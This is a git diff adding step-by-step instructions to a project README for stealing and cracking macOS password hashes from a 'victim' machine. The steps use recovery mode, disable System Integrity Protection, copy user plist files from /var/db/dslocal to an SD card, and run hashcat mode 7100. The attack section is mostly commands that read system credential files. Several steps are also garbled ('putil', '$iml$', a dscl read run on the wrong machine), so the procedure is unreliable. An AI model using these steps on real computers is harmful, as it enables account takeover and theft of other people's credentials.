@@ -7,7 +7,49 @@ This projet shows the process of extracting and cracking password hashes on Mac 
 ## Setup
 - **Target System ** :: Mac OS 12.++
 - **Attacker System** :: Mac OS 12.++
-- *Tools*: HashCat, dscl, SD card and plutil
+- *Tools*: HashCat, dscl, SD card, a word list and plutil
 
 
 ## Execution
+Step 1
+Restart Victim computer in recovery mode with [Hold Command + R] 
+Go ---> Util ----> Terminal
+---------------------------------------------------------------
+Step 2
+Disable System Integrity Protection
+csrutil status
+csrutil disable
+shutdown -r now
+---------------------------------------------------------------
+Step 3
+Extract the Password Hashes to SD card
+First Check the Name of the SD card
+ls /Volumes
+Now create a directory 
+mkdir /Volumes/Untitled/password_hashes
+Copy it 
+cp /var/db/dslocal/nodes/Default/users/*.plist /Volumes/Untitled/password_hashes/
+---------------------------------------------------------------
+Step 4 
+Insert the SD card into the attacker machine
+navagate to the password_hashes directory.
+In this case the victim machine user is testuser
+sudo dscl . -read /Users/testuser dsAttrTypeNative:ShadowHashData > testuser.hashdata
+---------------------------------------------------------------
+Step 5
+Clean Data
+cat testuser.hashdata | tail -n 1 | xxd -p -r | putil -convert xml1 - -o testuser.plist
+Now do 
+cat testuser.plist ---reference to Picture testuser.plist
+Here you must check for the SHA512-PBKDF2 called "integer>#####</integer
+then create a hash file by nano hash
+and paste the numbers in btw integer with $iml$ first to indicate that this is for MAC OS system
+
+Step 6 Get hash with base64
+now look at the data by the "entropy" and copy the numbers
+open a new command line and do echo <copy numbers go here> | base64 -d | xxd -p -c 256 do this also for the salt key
+now copy those two new string number into your hash file after $ and put other $ for the last number.
+
+Step 7 Hash Cat
+hashcat -a 0 -m 7100 hash worldlist.txt
+
